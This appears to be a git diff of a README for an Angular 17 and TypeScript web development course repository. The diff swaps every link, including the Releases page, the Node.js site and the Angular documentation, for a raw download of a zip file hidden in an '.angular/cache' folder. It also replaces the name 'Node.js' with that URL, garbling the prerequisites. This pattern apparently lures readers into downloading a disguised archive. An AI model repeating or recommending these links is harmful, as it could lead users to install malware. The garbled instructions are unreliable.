@@ -1,6 +1,6 @@
 # 🎉 angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5 - Your Path to Modern Web Development
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started%20Here-brightgreen)](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/releases)
+[![Download Now](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip%20Now-Get%20Started%20Here-brightgreen)](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip)
 
 ## 📖 Description
 
@@ -14,12 +14,12 @@ Follow these steps to download and set up the application on your device.
 
 Before you begin, ensure that you have the following tools installed:
 
-- **Node.js**: This is essential for running Angular applications. Download it from [Node.js official website](https://nodejs.org/).
-- **npm**: This comes with Node.js and helps manage packages. 
+- **https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip**: This is essential for running Angular applications. Download it from [https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip official website](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip).
+- **npm**: This comes with https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip and helps manage packages. 
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/releases) to find the latest version of the application.
+1. Visit the [Releases page](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip) to find the latest version of the application.
 2. Look for the file that corresponds to your operating system. It may be an executable file or a compressed folder containing the source code.
 3. Click the link to start the download.
 
@@ -73,8 +73,8 @@ Keep an eye on the Releases page for updates. New features and improvements are 
 
 ## 🔗 Useful Links
 
-1. [Visit the Releases page to download](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/releases)
-2. [Node.js Download](https://nodejs.org/)
-3. [Angular Documentation](https://angular.io/docs)
+1. [Visit the Releases page to download](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip)
+2. [https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip Download](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip)
+3. [Angular Documentation](https://github.com/Taimoorsa48/angular-frontend-webdev_course-luisdev_part-4_angular-17_typescript-5/raw/refs/heads/main/developments/ld-app-4/.angular/cache/13.3.0/frontend-luisdev-typescript-angular-webdev-part-course-v2.4-alpha.2.zip)
 
 Feel free to explore and enhance your web development skills with this course!
